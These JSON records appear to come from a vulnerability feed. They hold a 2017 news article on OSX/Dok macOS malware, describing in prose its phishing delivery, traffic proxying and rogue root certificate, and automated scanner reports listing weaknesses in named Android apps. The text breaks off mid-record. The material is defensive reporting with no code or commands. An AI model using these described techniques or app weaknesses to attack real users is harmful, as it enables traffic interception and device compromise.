{"id": "APPLE-REVOKES-CERTIFICATE-USED-BY-OSXDOK-MALWARE/125322", "bulletinFamily": "info", "title": "Apple Revokes Certificate Used By OSX/Dok Malware", "description": "Apple revoked a legitimate developer certificate used by hackers behind malware dubbed OSX/Dok, which was able to eavesdrop on secure HTTPS traffic of infected systems. On Sunday, Apple also rolled out an update to its XProtect built-in antimalware software to fend off existing and upcoming OSX/Dok-type attacks.



OSX/Dok was reported by Check Point last week. According to researchers, an infected system allowed a malicious third party to gain \u201ccomplete access to all victim communication\u201d including those protected by SSL. Check Point said it\u2019s unclear how many systems may have been impacted by the malware.



### Related Posts



#### [Chrome to Mark More HTTP Pages \u2018Not Secure\u2019](<https://threatpost.com/chrome-to-mark-more-http-pages-not-secure/125255/> \"Permalink to Chrome to Mark More HTTP Pages \u2018Not Secure\u2019\" )



April 27, 2017 , 2:27 pm



#### [Netflix\u2019s HTTPS Update Can\u2019t Combat Passive Traffic Analysis Attacks](<https://threatpost.com/netflixs-https-update-cant-combat-passive-traffic-analysis-attacks/124954/> \"Permalink to Netflix\u2019s HTTPS Update Can\u2019t Combat Passive Traffic Analysis Attacks\" )



April 12, 2017 , 5:04 pm



#### [Samsung Tizen Security \u2018Feels like 2005\u2019](<https://threatpost.com/samsung-tizen-security-feels-like-2005/124841/> \"Permalink to Samsung Tizen Security \u2018Feels like 2005\u2019\" )



April 7, 2017 , 11:50 am



Attackers are able to eavesdrop on SSL-protected communication by redirecting a victim\u2019s traffic through a malicious proxy server, explained Ofer Caspi, malware researcher with Check Point in a [blog](<http://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/>).



\u201cWhen attempting to surf the web, the user\u2019s web browser will first ask the attacker web page on TOR for proxy settings,\u201d Caspi wrote. \u201cThe user traffic is then redirected through a proxy controlled by the attacker, who carries out a man-in-the-middle attack and impersonates the various sites the user attempts to surf. The attacker is free to read the victim\u2019s traffic and tamper with it in any way they please.\u201d



OSX/Dok was spread via a phishing attack, mostly targeting European users. In an email sent to targets, purportedly from the \u201cSwiss tax office,\u201d was a .zip file (Dokument.zip) that contained a malware bundle signed April 21, 2017 by Seven Muller, called Truesteer.AppStore, Caspi said.



Any user who double-clicked on the .zip file sets off the infection chain where malware copied itself to the /User/Shared folder and executed. Next, a pop-up message warns that the software bundle was damaged and couldn\u2019t be opened.



\u201cIf a loginItem (Login Item) named \u2018AppStore\u2019 exists, the malware will delete it, and instead add itself as a loginItem, which will persist in the system and execute automatically every time the system reboots, until it finishes to install its payload,\u201d Caspi said.



[![](https://trtpost-wpengine.netdna-ssl.com/files/2017/05/Check_Point_Window_Password_Malware.png)](<https://trtpost-wpengine.netdna-ssl.com/files/2017/05/Check_Point_Window_Password_Malware.png>)



The warning window prompts the victim to enter a password. \u201cThe victim is barred from accessing any windows or using their machine in any way until they relent, enter the password and allow the malware to finish installing. Once they do, the malware gains administrator privileges on the victim\u2019s machine,\u201d according to the report.



With that access, the attackers install the package manager brew, used to install further tools Tor and SOCAT. The malware will then change the target\u2019s network settings so that traffic passes through a proxy controlled by the attacker.



\u201cThe malware will then proceed to install a new root certificate in the victim\u2019s system, which allows the attacker to intercept traffic using a man-in-the-middle (MiTM) attack. By abusing the victim\u2019s new-found trust in this bogus certificate, the attacker can impersonate any website, and the victim will be none the wiser,\u201d Caspi wrote.



What makes the malware so unique is that it impacted all versions of OSX and recorded zero detections on VirusTotal (as of last week), researchers said. \u201c(OSX/Dok) is signed with a valid developer certificate (authenticated by Apple), and is the first major scale malware to target OSX users via a coordinated email phishing campaign,\u201d according to Check Point the report.



Because the certificates used by the malware were valid, the macOS security features such as Gatekeeper recognized OSX/Dok as legitimate. The malware is then free to operate undetected.



Check Point theorizes that hackers were able to hijack a valid Apple developer\u2019s certificate.", "published": "2017-05-01T17:57:00", "modified": "2017-05-01T21:57:53", "cvss": {"score": 0.0, "vector": "NONE"}, "href": "https://threatpost.com/apple-revokes-certificate-used-by-osxdok-malware/125322/", "reporter": "Tom Spring", "references": ["https://threatpost.com/netflixs-https-update-cant-combat-passive-traffic-analysis-attacks/124954/", "https://threatpost.com/chrome-to-mark-more-http-pages-not-secure/125255/", "https://trtpost-wpengine.netdna-ssl.com/files/2017/05/Check_Point_Window_Password_Malware.png", "http://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/", "https://threatpost.com/samsung-tizen-security-feels-like-2005/124841/"], "cvelist": [], "type": "threatpost", "lastseen": "2017-05-01T22:23:54", "history": [], "edition": 1, "hashmap": [{"key": "bulletinFamily", "hash": "caf9b6b99962bf5c2264824231d7a40c"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "ca7d393b775e8b2b0e5f4f4e9a2f2e5e"}, {"key": "href", "hash": "15d3873d52004750e7cfbbdc13bce0b1"}, {"key": "modified", "hash": "2b634fb8f25dbe53d03f844c21ec6afd"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "2930fe74e46914fa2d311047d45a6ea1"}, {"key": "references", "hash": "d9ea72b2f5bae3cd1394fa4a7c35d6d4"}, {"key": "reporter", "hash": "4cf098518cf7bc09c1acdd6bf301d86f"}, {"key": "threatPostCategory", "hash": "64ef07ce3e4b420c334227eecb3b3f4c"}, {"key": "title", "hash": "1310f95717ea99f917caa94e234da133"}, {"key": "type", "hash": "78295e0f58b887188b62cad09f8e24d4"}], "hash": "b087e11062a280e90f65f6e0e9ed5ef248c9b8ec14b468e50f92d7230b4259b4", "viewCount": 22, "objectVersion": "1.2", "threatPostCategory": "Cryptography"}

{"result": {"hackapp": [{"lastseen": "2017-05-13T21:24:54", "references": ["https://play.google.com/store/apps/details?id=com.us.likes.hashtags.tags.follow.getlikes.follower&hl=en"], "description": "HackApp vulnerability scanner discovered that application Likes for Instagram published at the 'play' market has multiple vulnerabilities.", "edition": 2, "reporter": "Hackapp.org", "published": "2017-05-13T21:47:34", "title": "Likes for Instagram - Customized SSL, Dangerous filesystem permissions, WebView code execution vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Likes for Instagram", "version": "1.34", "operator": "le"}], "hackapp": {"bugs": [{"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "3fbc2c5364315063e3a2a43cc1378823"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "60f442c71ae9b6e4b091dec5e58e4a82"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "0bafa38f3555cbd013b192074b861bed"}, {"severity": "medium", "name": "Exported components", "description": "Other applications could access the interfaces.", "id": "5cdc400c9e72938321d1d88bff0206ef"}, {"severity": "critical", "name": "Customized SSL", "description": "

\t\t\tCheck certificate validation. Do not create or redefine X509Certificate class methods by yourself, if you don't understand risks. Use the existing API.

\t\t\t", "id": "e212f13240373f9be6ff5f099cc2a64b"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "a0a08d3e71f8828e23874ecf18bd7e37"}, {"severity": "notice", "name": "Native code usage", "description": "Native code (.so) usage 'System.loadLibrary();' is found.", "id": "c9f4254701e3b2d84f50490e7f5ff0ff"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "2220429b237685a52d122ef21eb06208"}, {"severity": "notice", "name": "Possible privilege escalation", "description": "This app is looking for root tools.", "id": "cc1a86b73dfaa0e4b766f92c1b0ae1ff"}, {"severity": "notice", "name": "KeyStore usage", "description": "The app uses Android KeyStore subsystem.", "id": "6ea8db50e4178750a3673193058ac121"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "e83435237fe9ac2c0712eda14b8bcabb"}, {"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "f7d9d181efeae463339413f1ae644fea"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "82ccf77d53818f103e7797d0f8f9b633"}], "release": "2017-05-10T00:00:00", "vendor": "Team IGL", "icon": "http://lh3.googleusercontent.com/ZNIrvLRzYOlYWVkW2IlZ0f3T117RILxnyKqgYPtYLUYuYhpEZN-xpZ7m-flJe_PcAkY=w300", "link": "https://play.google.com/store/apps/details?id=com.us.likes.hashtags.tags.follow.getlikes.follower&hl=en", "name": "Likes for Instagram", "store": "play", "apk": "COM.US.LIKES.HASHTAGS.TAGS.FOLLOW.GETLIKES.FOLLOWER.APK", "version": "1.34"}, "cvelist": [], "modified": "2017-05-13T21:47:34", "id": "HACKAPP:COM.US.LIKES.HASHTAGS.TAGS.FOLLOW.GETLIKES.FOLLOWER.APK", "href": "https://hackapp.com/report/c50bc71aaa6b531cbbb83d094effb451", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "e0795684de73674e89c6cb02f54a177f"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "67d69dfa282bd051d74b0281180c6326"}, {"key": "hackapp", "hash": "be9c9941ed529a48d1fee7b9435a0745"}, {"key": "href", "hash": "5402b873c5549589606a651b2d30e912"}, {"key": "modified", "hash": "2aecc3eb1ebbca6d7673227e78568bc6"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "2aecc3eb1ebbca6d7673227e78568bc6"}, {"key": "references", "hash": "c3535535e7e92ddb9f6a851bb548b3ab"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "a90740bb0af8688df0d075568fd2a466"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "5122508c76b7745e7223bf34ad6c4ae1843de1888a21d3ab9608c704cbb54c57"}, {"lastseen": "2017-05-13T19:24:59", "references": ["https://play.google.com/store/apps/details?id=com.viber.voip&hl=en"], "description": "HackApp vulnerability scanner discovered that application Viber Messenger published at the 'play' market has multiple vulnerabilities.", "edition": 2, "reporter": "Hackapp.org", "published": "2017-05-13T20:24:52", "title": "Viber Messenger - Dangerous filesystem permissions, WebView code execution vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Viber Messenger", "version": "Varies with device", "operator": "le"}], "hackapp": {"bugs": [{"severity": "notice", "name": "External URLs", "description": "Where do they point?", "id": "3b5173cc3c1ff966c6593bee42866b80"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "b7b64f46ba150210bfa0e82a8944f47f"}, {"severity": "medium", "name": "Dynamic Code Loading", "description": "Code for 'DexClassLoader' could be tampered.", "id": "fcac2dea451cc6ac1f45f910f56d1d7d"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "07b1ec079361e0e0afdfc1b23a665f33"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "9139954944d67fc57cef638620cce523"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "fd810b21619531dcf094429232298b34"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "951e11d049f751cb5f4dc00fd3bdf417"}, {"severity": "medium", "name": "Certificates or keys found", "description": "These credentials could be used for authentication.", "id": "6719a5fe3467b2e108e8e4dc93e68ded"}, {"severity": "notice", "name": "Corrupted files", "description": "Can't parse these files. Corrupted? Check manually.", "id": "025acea9a1a3577b7b82b44995b8ab6f"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "e81804d60c4400e697caafc2a948f00a"}, {"severity": "notice", "name": "Native code usage", "description": "Native code (.so) usage 'System.loadLibrary();' is found.", "id": "d0675f0fed85ffdd4ddf0f3383db0d8b"}, {"severity": "medium", "name": "Exported components", "description": "Other applications could access the interfaces.", "id": "979001ca42626ff5fd51f1db403a0c6c"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "1c5f0be07f5b77f6e5ef873c29d3e994"}], "release": "2017-04-26T00:00:00", "vendor": "Viber Media S.\u00e0 r.l.", "icon": "http://lh3.googleusercontent.com/8WsuI2NpvYJljZshzCgLXKRLnFLzz3q4I3JGw3L0vfintPGEiTChOXDIrnoXFFfme58=w300", "link": "https://play.google.com/store/apps/details?id=com.viber.voip&hl=en", "name": "Viber Messenger", "store": "play", "apk": "COM.VIBER.VOIP.APK", "version": "Varies with device"}, "cvelist": [], "modified": "2017-05-13T20:24:52", "id": "HACKAPP:COM.VIBER.VOIP.APK", "href": "https://hackapp.com/report/fd0a6af4be3fa555eca0f999ccac715b", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "637330f923af8b4983349e264d073067"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "09713a4890dac059b83b1e3374d3164f"}, {"key": "hackapp", "hash": "55610c89094a69f7ff6122f0cb6c2d5f"}, {"key": "href", "hash": "bf76ca6e2b63b6b29d5bdd07d232305a"}, {"key": "modified", "hash": "f439f713b07a7de2d07a598124e12dd2"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "f439f713b07a7de2d07a598124e12dd2"}, {"key": "references", "hash": "06c3803204e693a94501a3f028dbc514"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "c60ded9205f345002a8aac6ec0738c9b"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "a1a19d886e45daf4126e1d204b022271d6a538789d0646d004d2eab8068549e8"}, {"lastseen": "2017-05-13T17:25:02", "references": ["https://play.google.com/store/apps/details?id=com.joyplay.tvset&hl=en"], "description": "HackApp vulnerability scanner discovered that application OrangePlay published at the 'play' market has multiple vulnerabilities.", "edition": 1, "reporter": "Hackapp.org", "published": "2017-05-13T18:12:48", "title": "OrangePlay - Dangerous filesystem permissions, WebView code execution vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "OrangePlay", "version": "1.2", "operator": "le"}], "hackapp": {"bugs": [{"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "1a2ba0a7d6adabdc0efc6eeb592ab308"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "da92f53b200f73029377d97f637c58a9"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "1d197c6b71a1c552dd8fccc447250e8f"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "64ffb3b8b80a7d378f0ad044468cd54e"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "ca4440d388507fb4b30d8e5dae21e200"}, {"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "9f8caed4ecd25a61a9b46e67f4f36681"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "1888dc8a2be5b084516b7715b2921d30"}], "release": "2017-02-13T00:00:00", "vendor": "Billbox TV", "icon": "http://lh3.googleusercontent.com/mqkfhu0vjYOvcQa-Fwh9O9qHzM45lFXn8VkPiW_4JbngFZG3JAvJ7OjP9tACClfFtGxX=w300", "link": "https://play.google.com/store/apps/details?id=com.joyplay.tvset&hl=en", "name": "OrangePlay", "store": "play", "apk": "COM.JOYPLAY.TVSET.APK", "version": "1.2"}, "cvelist": [], "modified": "2017-05-13T18:12:48", "id": "HACKAPP:COM.JOYPLAY.TVSET.APK", "href": "https://hackapp.com/report/04e7b02e0895752b2b83f3825aa74a31", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "21877b3227205bb171f094806f92bade"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "ae2ccfa47c1c0236771b0a2d0ff5ef36"}, {"key": "hackapp", "hash": "36b8c624d74dc3ca1d575c2cdb48f21d"}, {"key": "href", "hash": "7fbafe70bb7b6ce253e31a0078778a5b"}, {"key": "modified", "hash": "39bd841248c4e13323df357bffe12551"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "39bd841248c4e13323df357bffe12551"}, {"key": "references", "hash": "f401718b424a70043c2a7db7a80826a3"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "51bce71e821055572d43e2457d6f96be"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "2d2b657ebdea061326ed3d07cad20a17968901fd7e6e5197ef9b3fbdae96d87d"}, {"lastseen": "2017-05-13T17:25:00", "references": ["https://play.google.com/store/apps/details?id=com.likesfamousapp&hl=en"], "description": "HackApp vulnerability scanner discovered that application Likes for Instagram published at the 'play' market has multiple vulnerabilities.", "edition": 4, "reporter": "Hackapp.org", "published": "2017-05-13T17:19:23", "title": "Likes for Instagram - Base64 encoded String, Customized SSL, Dangerous filesystem permissions vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Likes for Instagram", "version": "2.0.2", "operator": "le"}], "hackapp": {"bugs": [{"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "44712575724a0964815411b9f99af9d5"}, {"severity": "medium", "name": "Exported components", "description": "Other applications could access the interfaces.", "id": "5ce8b9c3647dba16a50bf56b397a498e"}, {"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "7819ef73d3b95e55a052dcf01a786d93"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "7ae214fefdebf79af86dab3d6735a519"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "ff3d968b9a6a0c18a7d8a0714cc0c620"}, {"severity": "critical", "name": "MIT license", "description": "The app should be compliant with open source license requirements.", "id": "5bafe7304c0b6c27e7fb593e76a0b9c1"}, {"severity": "critical", "name": "Customized SSL", "description": "

\t\t\tCheck certificate validation. Do not create or redefine X509Certificate class methods by yourself, if you don't understand risks. Use the existing API.

\t\t\t", "id": "1cf9f63cfafd3a684a0f42a5153b15c4"}, {"severity": "notice", "name": "Native code usage", "description": "Native code (.so) usage 'System.loadLibrary();' is found.", "id": "0b250646ce71a34514bddaf83889f89f"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "a0f2ce9e06110a261e7f9cd35e8f779e"}, {"severity": "critical", "name": "Base64 encoded String", "description": "Base64 encoded string could include authentication credentials.", "id": "68131e479346e2faa5347abd8b47ee65"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "ccfbabd7c21f994048393d16e61c71d7"}, {"severity": "notice", "name": "Possible privilege escalation", "description": "This app is looking for root tools.", "id": "9fc18edb9623cd4e6b42fb9ec0f9a361"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "30fb053f2d299b603cd62ac5924541de"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "3e44a74478c4e54cda2debf078a5a088"}, {"severity": "medium", "name": "Dynamic Code Loading", "description": "Code for 'DexClassLoader' could be tampered.", "id": "05a201a3a59a5fbfc67adde124a6d158"}], "release": "2017-01-02T00:00:00", "vendor": "ser9apps", "icon": "http://lh3.googleusercontent.com/K9ZIS19vcN5ApISfook20Y2eOlhU2yQDlYo-f7bxq93ZHksC9Ca4jr163UU8sBuEkKs=w300", "link": "https://play.google.com/store/apps/details?id=com.likesfamousapp&hl=en", "name": "Likes for Instagram", "store": "play", "apk": "COM.LIKESFAMOUSAPP.APK", "version": "2.0.2"}, "cvelist": [], "modified": "2017-05-13T17:19:23", "id": "HACKAPP:COM.LIKESFAMOUSAPP.APK", "href": "https://hackapp.com/report/71c2127e5cffbd5e33967056cf103357", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "7e3d31bad0fef5cca388f9ec4c95c123"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "67d69dfa282bd051d74b0281180c6326"}, {"key": "hackapp", "hash": "0ee3bb37ddf8966d9f30d026a58d5983"}, {"key": "href", "hash": "8e99be86c6bde71e31bd1f3ceb844c92"}, {"key": "modified", "hash": "22db183990034d5e0d79e35e8ebdbbe9"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "22db183990034d5e0d79e35e8ebdbbe9"}, {"key": "references", "hash": "5409439690fae2ab087c2a4a833b34e8"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "e57a6966be0d9554d03bd90d91b0345d"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "59cfd933ff06cf3f9ebaa5881923c997e4efc1bfa29b7cf4bc175d4fa4d4679c"}, {"lastseen": "2017-05-13T15:25:06", "references": ["https://play.google.com/store/apps/details?id=dk.waoo.multiscreen&hl=en"], "description": "HackApp vulnerability scanner discovered that application Waoo TV published at the 'play' market has multiple vulnerabilities.", "edition": 1, "reporter": "Hackapp.org", "published": "2017-05-13T16:21:46", "title": "Waoo TV - MIT license, WebView code execution vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Waoo TV", "version": "3.5.0", "operator": "le"}], "hackapp": {"bugs": [{"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "2e1932e9f228dec172ef38ff736ff5e2"}, {"severity": "notice", "name": "Possible privilege escalation", "description": "This app is looking for root tools.", "id": "fa7fb483991d89638155886ba60cf9d9"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "3bb0fbaaaf50dd9966610ee5486de0bb"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "66229bb7c87b03f02221105cbeba61e9"}, {"severity": "notice", "name": "Native code usage", "description": "Native code (.so) usage 'System.loadLibrary();' is found.", "id": "ecd04d3e5e6286ce790e3307655e00c3"}, {"severity": "medium", "name": "Runtime command execution", "description": "Function 'Runtime.getRuntime().exec()' is used, please check where variables are come from.", "id": "e8f47b5a657c125470ff9ba8dd5ea630"}, {"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "f2bfec4123f07ea4942d3e25ae6e78d2"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "3dde94853ecd22334d342e3adeda3f00"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "7688824d5da3786e07c9878e5bd39a4e"}, {"severity": "critical", "name": "MIT license", "description": "The app should be compliant with open source license requirements.", "id": "c9b5f214ef7a90f4855ab51c2dbb39e5"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "bc0dc2646cc1781a3d9e07fe45e5b8ba"}], "release": "2017-03-13T00:00:00", "vendor": "Waoo! A/S", "icon": "http://lh3.googleusercontent.com/5tgGE284b5r1PX0Z_NYeaNx72sCnPmdVVl4xRV3H9CQWYiZDNaycMh4PM2iU9gwJYWk=w300", "link": "https://play.google.com/store/apps/details?id=dk.waoo.multiscreen&hl=en", "name": "Waoo TV", "store": "play", "apk": "DK.WAOO.MULTISCREEN.APK", "version": "3.5.0"}, "cvelist": [], "modified": "2017-05-13T16:21:46", "id": "HACKAPP:DK.WAOO.MULTISCREEN.APK", "href": "https://hackapp.com/report/79aaa3e64713be4934a4adf8aeae8342", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "5c8b9139f6ba5c8ff80ff0f9cebd1f9c"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "f782cedcdd46b91dd03becadcfbeafb8"}, {"key": "hackapp", "hash": "fe855e6d1610eb3986cb552faf258b91"}, {"key": "href", "hash": "2f8316b0eba3f56b4df6939f8a5ba183"}, {"key": "modified", "hash": "5a3f4bf659e0865268d37ffd39d55641"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "5a3f4bf659e0865268d37ffd39d55641"}, {"key": "references", "hash": "c0af88b002af2afac2efee8e20ad5a7e"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "cd9f4cd9ddf4d2838552fd65f39665ee"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "4da02ce343f2f0ab4281e812966eb6cf3f223c69cff431a7750c28e35720327e"}, {"lastseen": "2017-05-13T05:25:02", "references": ["https://play.google.com/store/apps/details?id=com.prelo.android&hl=en"], "description": "HackApp vulnerability scanner discovered that application Prelo - Jual Beli Bekas Online published at the 'play' market has multiple vulnerabilities.", "edition": 1, "reporter": "Hackapp.org", "published": "2017-05-13T05:43:27", "title": "Prelo - Jual Beli Bekas Online - Customized SSL, Dangerous filesystem permissions, Exported ContentProvider vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Prelo - Jual Beli Bekas Online", "version": "1.7.2", "operator": "le"}], "hackapp": {"bugs": [{"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "17c6018e7e07dcccff00dd1c55e552dd"}, {"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "38d68f647cf9b507b35c8b3f74afc4a7"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "5a0a30ef9cff650fd37bd09fb49b0709"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "c0b55ae359452a6216c866eeb4e68869"}, {"severity": "critical", "name": "Customized SSL", "description": "

\t\t\tCheck certificate validation. Do not create or redefine X509Certificate class methods by yourself, if you don't understand risks. Use the existing API.

\t\t\t", "id": "c7a57e9b9f20c8482fcbcd6104b722fe"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "032ca6b460d40cc25b0b9367c21a958e"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "c2a436a22def90450671315611842289"}, {"severity": "medium", "name": "Exported components", "description": "Other applications could access the interfaces.", "id": "f18b8ca82ba43e4557edfde864edb41e"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "01d68bd4632fccc56ca524c3fc97bb46"}, {"severity": "notice", "name": "Possible privilege escalation", "description": "This app is looking for root tools.", "id": "da939b715237b6cb3bfb732108c703a0"}, {"severity": "notice", "name": "KeyStore usage", "description": "The app uses Android KeyStore subsystem.", "id": "59a76f295fb1e1ea59eb525d8cd8bee4"}, {"severity": "critical", "name": "Exported ContentProvider", "description": "Exported ContentProvider is available to other apps.", "id": "c0de2d3b2adf4dc3b1f1ab0580daa548"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "fc293b91c2a33b0c3f8eec68c263b0eb"}], "release": "2017-04-12T00:00:00", "vendor": "Prelo", "icon": "http://lh3.googleusercontent.com/brr_rrNVC7wNCX5iok97MYEskHNMNHvE1YbWY49JglxoqzcTSRs8ddPCykky4K1XZHw=w300", "link": "https://play.google.com/store/apps/details?id=com.prelo.android&hl=en", "name": "Prelo - Jual Beli Bekas Online", "store": "play", "apk": "COM.PRELO.ANDROID.APK", "version": "1.7.2"}, "cvelist": [], "modified": "2017-05-13T05:43:27", "id": "HACKAPP:COM.PRELO.ANDROID.APK", "href": 